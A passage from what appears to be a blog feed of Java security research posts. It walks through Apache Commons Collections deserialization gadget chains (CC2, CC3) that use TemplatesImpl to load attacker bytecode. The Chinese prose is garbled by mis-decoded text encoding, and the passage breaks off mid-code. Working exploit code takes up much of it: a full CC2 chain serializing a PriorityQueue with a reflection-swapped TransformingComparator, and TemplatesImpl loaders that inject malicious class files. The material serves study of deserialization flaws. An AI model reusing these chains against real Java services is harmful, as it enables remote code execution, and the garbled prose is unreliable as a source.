å‚æ•°ï¼ŒåªçŸ¥é“é€šè¿‡chainedTranfromeré“¾å¼ã€‚</p><p>ç°åœ¨å¯ä»¥ç”¨TransformingComparator.compareè§¦å‘transformæ–¹æ³•ï¼Œå¹¶ä¸”å¯ä»¥å‘transformä¼ å‚ã€‚äºæ˜¯å¯ä»¥çœå»æ•°ç»„ï¼ˆå…¶å®æˆ‘ä»¬ä¸ç”¨è¿™ä¸ªï¼Œç›´æ¥åå°„æ”¹InstantiateTransformerçš„å€¼ä¹Ÿèƒ½çœå»æ•°ç»„ï¼‰</p><p>ç°åœ¨æˆ‘ä»¬éœ€è¦æ„é€ è¿™ä¸ªï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer.transform(TemplatesImpl)</span><br></pre></td></tr></table></figure><p>ç”¨TransformingComparator.compareä¼ å‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802155015810.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802155015810.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>obj1ï¼Œobj2æ¥è‡ªä¸‹é¢å‡½æ•°çš„cï¼Œqueue[right]ã€‚è¿™æ˜¯ä¸ªå †æ’åºç®—æ³•ã€‚æˆ‘ä»¬å…¨ä¼ TemplatesImplæ¶æ„å­—èŠ‚ç </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802161235365.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802161235365.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å®Œæ•´ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\CC6TiedMapEntry2.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(invokerTransformer,<span class="literal">null</span>);</span><br><span class="line">        PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>)));</span><br><span class="line">        priorityQueue.add(templatesClass);</span><br><span class="line">        priorityQueue.add(templatesClass);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">compareField</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        compareField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        compareField.set(priorityQueue,transformingComparator);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;cc6.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserialç»™å‡ºçš„é“¾å­ç”¨çš„toStringå…ˆå ä½ï¼Œé¿å…è¯¯è§¦å‘ï¼Œæˆ‘è¿™é‡Œç”¨çš„<code>new ConstantTransformer&lt;&gt;(1)</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802161006700.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802161006700.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…¶ä»–çš„CCé“¾æ‡’å¾—åˆ†æäº†ï¼Œéƒ½ä¸€æ ·ã€‚</p><p>å…¶å®ä¸ç”¨åˆ»æ„å»è®°é“¾å­ï¼Œåˆ†æå®Œäº†éƒ½è®°ä¸ä½çš„ï¼Œå¾ˆæ­£å¸¸ï¼Œéœ€è¦çš„æ—¶å€™å†å»ç¿»é“¾å­å›¾ï¼Œè‡ªå·±é‡æ–°æ„é€ èµ·æ¥ä¹Ÿå¾ˆå¿«ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> CC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸºäºç±»åŠ è½½çš„å¤šè·¯å¾„TemplatesImpl CC3</title>
      <link href="/2024/08/01/duo-lu-jing-templatesimpl-cc3/"/>
      <url>/2024/08/01/duo-lu-jing-templatesimpl-cc3/</url>
      
        <content type="html"><![CDATA[<p>ä¸Šä¸€æ–‡è®²åˆ°ç±»åŠ è½½çš„åº•å±‚åŸç†</p><p><a href="https://godownio.github.io/2024/07/31/java-lei-jia-zai-ji-shuang-qin-wei-pai/">https://godownio.github.io/2024/07/31/java-lei-jia-zai-ji-shuang-qin-wei-pai/</a></p><p>æœ€åæ˜¯defineClassåŠ è½½ç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731182329733.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731182329733.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å°½ç®¡defineClassæ˜¯protected finalï¼Œå…¶ä»–åœ°æ–¹ä¾ç„¶æœ‰è°ƒç”¨åˆ°è¯¥æ–¹æ³•ï¼Œè®©æˆ‘ä»¬å¯ä»¥æ„é€ åº•å±‚çš„æ¶æ„ç±»åŠ è½½æ”»å‡»ã€‚</p><p>æ¯”å¦‚bcelï¼ŒTemplatesImpl</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731190735428.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731190735428.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…ˆæ¥çœ‹TemplatesImpl$TransletClassLoader</p><h1 id="CC3-TemplatesImplé“¾"><a href="#CC3-TemplatesImplé“¾" class="headerlink" title="CC3 TemplatesImplé“¾"></a>CC3 TemplatesImplé“¾</h1><h2 id="newInstanceåŠ è½½"><a href="#newInstanceåŠ è½½" class="headerlink" title="newInstanceåŠ è½½"></a>newInstanceåŠ è½½</h2><p>è¯¥æ–¹æ³•ä¸ºdefaultå±æ€§ï¼Œå¿…å®šè¢«ç±»å†…å…¶ä»–æ–¹æ³•è°ƒç”¨ï¼Œè·Ÿè¿›ä¸€ä¸‹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801090429873.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801090429873.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨åŒä¸€ä¸ªç±»é‡Œçš„defineTransletClasses()å¾ªç¯è°ƒç”¨äº†è¯¥æ–¹æ³•åŠ è½½_bytecodesæ•°ç»„ã€‚è¯»ä¸€ä¸‹ä»£ç ï¼Œåªè¦_bytecodes[]ä¸ä¸ºç©ºï¼Œå°±èƒ½è§¦å‘defineClass</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801090629731.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801090629731.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¯¥privateæ–¹æ³•ä¹Ÿå¿…å®šè¢«ç±»å†…å…¶ä»–æ–¹æ³•è°ƒç”¨ï¼Œæœ‰ä¸‰ä¸ªæ–¹æ³•éƒ½è°ƒç”¨äº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801090946739.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801090946739.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…ˆçœ‹ä¸€ä¸‹ç¬¬ä¸€ä¸ªgetTransletClasses()æ–¹æ³•ï¼Œæ³¨æ„ä¸Šé¢çš„è‹±æ–‡æ³¨é‡Šï¼Œè¯¥æ–¹æ³•å‡ºäºå®‰å…¨åŸå› è®¾ä¸ºç§æœ‰ï¼Œå› ä¸ºå’ŒApacheéƒ¨åˆ†é¡¹ç›®æ•´åˆçš„åŸå› æ‰æ²¡æœ‰ç§»é™¤ã€‚æ‰€ä»¥æˆ‘ä»¬æ²¡æœ‰Apacheçš„é¡¹ç›®æ˜¯æ²¡æœ‰è°ƒç”¨è¯¥æ–¹æ³•çš„åœ°æ–¹çš„ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801091800270.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801091800270.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>getTransletIndexä½œä¸ºpublicä¹Ÿæ²¡æœ‰åœ°æ–¹è¢«è°ƒç”¨</p><p>é‚£åªèƒ½çœ‹getTransletInstanceäº†ï¼Œæ–¹æ³•åå«è·å–è½¬ç§»å®ä¾‹ï¼Œæ–¹æ³•å†…æ­£å¥½å°±æœ‰newInstance()ï¼Œè¿™ä¸å·§äº†å—ï¼</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801092338109.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801092338109.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è§¦å‘defineTransletClasses()å¹¶èµ°åˆ°newInstanceï¼Œéœ€è¦_nameä¸ä¸ºç©ºï¼Œ_classä¸ºç©º</p><h2 id="public-newTransformeræ–¹æ³•è°ƒç”¨"><a href="#public-newTransformeræ–¹æ³•è°ƒç”¨" class="headerlink" title="public newTransformeræ–¹æ³•è°ƒç”¨"></a>public newTransformeræ–¹æ³•è°ƒç”¨</h2><p>getTransletInstanceä½œä¸ºprivateï¼Œè¿˜å¾—å¾€ä¸Šæ‰¾åˆ°publicï¼Œå› ä¸ºåˆ«çš„ç±»åªèƒ½è°ƒç”¨å¦ä¸€ä¸ªç±»çš„publicæ–¹æ³•ï¼Œè¿™æ ·æ‰èƒ½è½¬åˆ°readObjectå˜›ã€‚å‘ä¸Šèµ°åˆ°newTransformer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801093005119.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801093005119.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆ‘ä»¬å»ºä¸€ä¸ªTransfomerImplå®ä¾‹æµ‹è¯•ä¸€ä¸‹</p><p>TransfomerImplæœ‰ä¸€ä¸ªç©ºçš„æ„é€ å‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801133458125.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801133458125.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>_nameä¸ä¸ºç©ºï¼Œ_classä¸ºç©ºï¼Œ_bytecodesä¸ºæ¶æ„ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\CC6TiedMapEntry.class&quot;</span>));</span><br><span class="line">      <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">      Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">      <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">          field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">          <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">              field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">              field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„åœ¨defineTransletClassesä¸­ï¼Œ_tfactoryè°ƒç”¨äº†æ–¹æ³•ï¼Œè™½ç„¶_tfactoryä¸ºtransientï¼Œæ— æ³•åºåˆ—åŒ–ä¼ é€’ï¼Œ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801134035080.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801134035080.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä½†è¯¥ç±»çš„readObjectç»™_tfactoryèµ‹äº†å€¼ã€‚æˆ‘ä»¬æµ‹è¯•çš„æ—¶å€™ä¹Ÿå…ˆç»™ä¸ªå€¼</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801134157676.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801134157676.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬çš„CC6ä»£ç è¦åœ¨newInstanceæ—¶è§¦å‘ï¼Œæ‰€ä»¥è¦æŠŠæ•´ä¸ªdefineTransletClasses()èµ°å®Œã€‚æœ‰æŠ¥é”™å°±è¦å¤„ç†ã€‚</p><p>è¯»ä¸€ä¸‹è¿™æ®µä»£ç ï¼ŒclassCountä¸ºbytecodesæ•°ç»„å…ƒç´ ä¸ªæ•°ï¼Œå¤§äº1æ‰ç»™auxClassesèµ‹å€¼ã€‚å¦‚æœè¿™é‡Œä¸èµ‹å€¼ï¼Œåé¢çš„auxClasses.putä¼šæŠ¥é”™ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬æœ‰ä¸¤ç§è§£å†³åŠæ³•ï¼Œä¸€ç§æ˜¯ä¼ ä¸¤ä¸ªbyteå…ƒç´ çš„bytecodesï¼Œè¿™æ ·classCount&gt;1ï¼Œå°±èƒ½putè¿›å»ã€‚å¹¶åå°„ä¿®æ”¹_transletIndexçš„å€¼ä¸å°äº0ï¼Œä¸ç„¶ä¼šæŠ¥Errorã€‚ä¸€ç§æ˜¯èµ°ifï¼Œä¸ç”¨ç®¡auxClasses</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801134843495.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801134843495.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="åŒbyteé€šè¿‡else"><a href="#åŒbyteé€šè¿‡else" class="headerlink" title="åŒbyteé€šè¿‡else"></a>åŒbyteé€šè¿‡else</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\CC6TiedMapEntry.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[] code2 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\BImpl.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1,code2&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_transletIndex&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        templatesClass.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>code2éšä¾¿ä¼ ï¼Œä½†æ³¨æ„ä¸èƒ½å’Œcode1ç›¸åŒï¼Œä¼šè¿›ç¬¬ä¸€ä¸ªcatchï¼Œä¹Ÿä¸èƒ½ä¸ºç©ºï¼Œä¼šè¿›ç¬¬äºŒä¸ªcatchã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801135629459.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801135629459.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä½†æ˜¯ç”±äºæˆ‘ä»¬ä¼ å…¥çš„ç±»æ— æ³•è½¬ä¸ºAbstractTransletè€ŒæŠ¥é”™ã€‚ä½†æ˜¯ä¸é‡è¦</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801135931055.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801135931055.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="ç»§æ‰¿AbstractTransleté€šè¿‡if"><a href="#ç»§æ‰¿AbstractTransleté€šè¿‡if" class="headerlink" title="ç»§æ‰¿AbstractTransleté€šè¿‡if"></a>ç»§æ‰¿AbstractTransleté€šè¿‡if</h3><p>ç¬¬äºŒç§æ–¹å¼ï¼Œèµ°è¿›ifï¼Œä¸èµ°elseï¼Œå°±ä¸ç”¨ç®¡auxClassesã€‚è€Œä¸”ç»™transletIndexèµ‹å€¼äº†ï¼Œä¸ç”¨è‡ªå·±å»èµ‹å€¼ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801135711749.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801135711749.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚æœè¦èµ°è¿›ifï¼Œéœ€è¦åŠ è½½çš„ç±»ç»§æ‰¿è‡ªå¦‚ä¸‹ç±»ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801135825907.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801135825907.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é‚£æˆ‘ä»¬æ”¹ä¸€ä¸‹CC6ï¼Œç»§æ‰¿AbstractTransletå¹¶å®ç°æŠ½è±¡æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> 